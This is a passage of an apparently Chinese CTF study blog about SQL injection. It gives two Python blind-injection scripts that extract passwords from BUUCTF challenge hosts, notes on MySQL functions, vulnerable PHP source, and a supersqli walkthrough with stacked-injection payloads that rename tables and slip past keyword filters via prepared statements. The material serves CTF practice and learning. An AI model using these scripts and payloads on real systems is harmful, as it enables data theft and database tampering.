<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#然后是二分法，二分法要快很多：</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span>(<span class="params">i,j</span>):</span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span></span><br><span class="line">    sql = <span class="string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">    data = &#123;<span class="string">&quot;id&quot;</span>:sql&#125;</span><br><span class="line">    r = requests.get(url,params=data)</span><br><span class="line">    <span class="comment"># print (r.url)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Click&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>) :</span><br><span class="line">        <span class="built_in">print</span>(i,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        low = <span class="number">31</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high :</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            res = payload(i,mid)</span><br><span class="line">            <span class="keyword">if</span> res :</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">        f = <span class="built_in">int</span>((low + high + <span class="number">1</span>)) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="number">127</span> <span class="keyword">or</span> f == <span class="number">31</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># print (f)</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(f)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag=&#x27;</span>,flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://35737a35-63b7-4e60-a584-e5cbbead6dc6.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line"><span class="comment">#give_grandpa_pa_pa_pa</span></span><br><span class="line"></span><br><span class="line">payload_table=<span class="string">&#x27;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">132</span></span><br><span class="line">    mid = (low + high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        payload = payload_table.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low+high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">a) Version()；当前 mysql 的版本</span><br><span class="line">b) Database();当前网站使用的数据库</span><br><span class="line">c) User();当前 MySQL 的用户</span><br><span class="line">d) system_user(); 系统用户名</span><br><span class="line">e）session_user();连接数据库的用户名</span><br><span class="line">f)current_user;当前用户名</span><br><span class="line">g)load_file();读取本地文件</span><br><span class="line">h)length(str) : 返回给定字符串的长度，如 length(“string”)=6</span><br><span class="line">i)substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度 ,如 substr(“chinese”,3,2)=“in”</span><br><span class="line">substr()、stbstring()、mid() 三个函数的用法、功能均一致</span><br><span class="line">j)concat(username)：将查询到的username连在一起，默认用逗号分隔</span><br><span class="line">concat(str1,’’,str2)：将字符串str1和str2的数据查询到一起，中间用连接</span><br><span class="line">group_concat(username) ：将username数据查询在一起，用逗号连接</span><br><span class="line">left(m,n) --从左向右截取字符串 m 返回其前 n 位</span><br><span class="line">substr(m,1,1) --取字符串 m 的左边第一位起，1 字长的字符串</span><br><span class="line">ascii(m) --返回字符 m 的 ASCII 码</span><br><span class="line">base64(m)—返回字符 m 的 base64 编码 • if(str1,str2,str3)–如果 str1 正确就执行 str2，否则执行 str3</span><br><span class="line">sleep(m)–使程序暂停 m 秒</span><br><span class="line">length(m) --返回字符串 m 的长度</span><br><span class="line">count(column_name) --返回指定列的值的数目</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160584#h2-7">CTF中几种通用的sql盲注手法和注入的一些tips - 安全客，安全资讯平台 (anquanke.com)</a></p>
<h1 id="题"><a href="#题" class="headerlink" title="题"></a>题</h1><p>[BUUCTF<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ophxc/p/13160638.html?msclkid=13cbb19da7ee11eca92f21a34f488ed0#">归纳]sql注入相关题目 - op_hxc - 博客园 (cnblogs.com)</a></p>
<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb1"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb1" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb1"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb1</h2><p>用御剑扫描之后可以得到robots.txt文件，这个文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>

<p>但是文件名字不知道，在查看源码中得到image.php?id=1   </p>
<p>从这点可以推测到存在sql注入，并且文件的名字为image</p>
<p>访问image.php.bak,可以得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;<span class="comment">//包含config.php文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;<span class="comment">//三目运算符，id为空则赋值为1，不为空则获得它的值</span></span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;<span class="comment">//path等同于上面</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);<span class="comment">//转义</span></span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);<span class="comment">//转义</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);<span class="comment">//第一个是转义字符，guo&#x27;l</span></span><br><span class="line"><span class="variable">$path</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="攻防世界-supersqli"><a href="#攻防世界-supersqli" class="headerlink" title="攻防世界-supersqli"></a>攻防世界-supersqli</h2><p>打开是sql注入，但是过滤了好多东西 /select|update|delete|drop|insrt|where|./i</p>
<p>网上搜了搜开始尝试着绕过，但是尝试了好几种绕过方法都不行，看了一下wp，知道是要采用堆叠注入，第一次知道，网上开搜。</p>
<p>1.查数据库</p>
<p>-1’;show databases;#</p>
<p>但是不明白，感觉查这个库没啥子作用</p>
<p>2.查表</p>
<p>-1’;show tables;#</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>出现了两个表单，都查询看一下嘛</p>
<p>3.查列表</p>
<p>（1）-1‘;show columns from <code>1919810931114514</code>;#</p>
<p>​    字符串为表名时进行操作时要加反引号``这两个标记符号，弄了我好长时间，没注意到反引号这玩意，错把单引号当反引号</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述">    flag ,NO字段</p>
<p>（2）-1’;show columns from <code>words</code>;#</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>id,NO等字段</p>
<p>因为这里是字段，而不是列名，不能直接进行查询。而且通过观察int()发现，写入到的内容存到了id中，推测查询的是words表中的内容，即输入的内容都会在words这个表中进行查询，但是flag不在这个表中</p>
<p>4.<strong>查询字段内容</strong></p>
<p>有两种方法</p>
<p>1.改表名</p>
<p>根据在words表里发现id字段与查询框里的出的数据类型相同，一个数字，一个字符串，所以猜测默认查询的就是words表，inject（搜索框中）值应该赋给了id<br>利用：我们可以将含有flag字段的表命名为word，然后修改字段名字，不就查询到我们想要的结果！（前提是这里rename，alert关键字 没有做过滤）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #</span><br></pre></td></tr></table></figure>

<p>查看flag</p>
<p>1’ or 1=1#</p>
<p>2.预编译来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‘;sEt @sql = CONCAT(‘se’,‘lect * from <code>1919810931114514</code>;’); 进行预编译<br>prEpare stmt from @sql; 设置变量<br>EXECUTE stmt;# 执行</p>
<p>对预编译不是很了解，了解之后再做补充吧！！</p>
<p>最后，不愧是强网杯的题，真是难呀</p>
<p>参考文章：[(40条消息) 攻防世界-supersqli详解_Mr_helloword的博客-CSDN博客](</p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
                        
                    
                        
                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='true'
        data-ae='true'
        data-ci=''
        data-cs=''
        data-r=''
        data-o=''
        data-a=''
        data-d='false'
    >查看评论</div>


    </div>
    
        <div class='side'>
			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%A2%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94-SQL-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">•基于布尔 SQL 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2left"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">▲left</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2ascii-substr"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">▲ascii() substr()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2ascii-substr-select-database-1-1-98"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">▲ascii(substr((select database()),1,1))&#x3D;98</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2ord-mid"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">▲ord() mid()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2regexp-%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">▲regexp 正则注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2like"><span class="toc-number">1.2.1.6.</span> <span class="toc-text">▲like</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%A2%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84-SQL-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">•基于报错的 SQL 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2floor"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">▲floor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2-double-%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E8%B6%85%E5%87%BA%E8%8C%83%E5%9B%B4%E8%BF%9B%E8%A1%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">▲ double 数值类型超出范围进行报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2%E5%8F%8C%E6%B3%A8"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">▲双注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2bigint"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">▲bigint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2extractvalue"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">▲extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2updatexml"><span class="toc-number">1.2.2.6.</span> <span class="toc-text">▲updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2%E9%87%8D%E5%A4%8D%E6%80%A7"><span class="toc-number">1.2.2.7.</span> <span class="toc-text">▲重复性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%A2%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84-SQL-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">•基于时间的 SQL 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2sleep"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">▲sleep</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2BENCHMARK"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">▲BENCHMARK</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">异或注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%85%B3%E9%94%AE%E5%AD%97%EF%BC%9Aand%E3%80%81or%E8%BF%87%E6%BB%A4%E4%BA%86%E9%80%97%E5%8F%B7%EF%BC%8C%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">过滤了关键字：and、or过滤了逗号，过滤了空格</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#regexp-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">regexp****注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.</span> <span class="toc-text">order by盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-WEB-%E3%80%90GYCTF2020%E3%80%91Ezsqli-1-Fan%E7%9A%84%E5%B0%8F%E9%85%92%E9%A6%86-fanygit-github-io-https-fanygit-github-io-2021-08-21-GYCTF2020-Ezsqli-1-msclkid-75a0462da7f211ecb8afadeb73123d5b"><span class="toc-number">1.7.1.</span> <span class="toc-text">[BUUCTF-WEB 【GYCTF2020】Ezsqli 1 | Fan的小酒馆 (fanygit.github.io)](https:&#x2F;&#x2F;fanygit.github.io&#x2F;2021&#x2F;08&#x2F;21&#x2F;[GYCTF2020]Ezsqli 1&#x2F;?msclkid&#x3D;75a0462da7f211ecb8afadeb73123d5b)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-sys-schema-auto-increment-columns-%E6%9D%A5%E6%B3%A8%E8%A1%A8%E5%90%8D"><span class="toc-number">1.7.2.</span> <span class="toc-text">用 sys.schema_auto_increment_columns 来注表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sys-schema-table-statistics-with-buffer"><span class="toc-number">1.7.3.</span> <span class="toc-text">sys.schema_table_statistics_with_buffer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-innodb-table-stats"><span class="toc-number">1.7.4.</span> <span class="toc-text">mysql.innodb_table_stats</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sys-schema-table-statistics"><span class="toc-number">1.7.5.</span> <span class="toc-text">sys.schema_table_statistics</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E5%85%A8"><span class="toc-number">1.9.</span> <span class="toc-text">sql注入绕过大全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.10.</span> <span class="toc-text">注入流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#boolean%E6%B3%A8%E5%85%A5"><span class="toc-number">1.11.</span> <span class="toc-text">boolean注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.12.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.13.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.14.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#load-file"><span class="toc-number">1.15.</span> <span class="toc-text">load_file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">1.16.</span> <span class="toc-text">脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">1.17.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E5%B7%A7"><span class="toc-number">1.18.</span> <span class="toc-text">技巧</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb1"><span class="toc-number">2.1.</span> <span class="toc-text">[CISCN2019 总决赛 Day2 Web1]Easyweb1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-supersqli"><span class="toc-number">3.1.</span> <span class="toc-text">攻防世界-supersqli</span></a></li></ol></li></ol>	
        </div>
    
</div>


    </div>
</div>
</body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
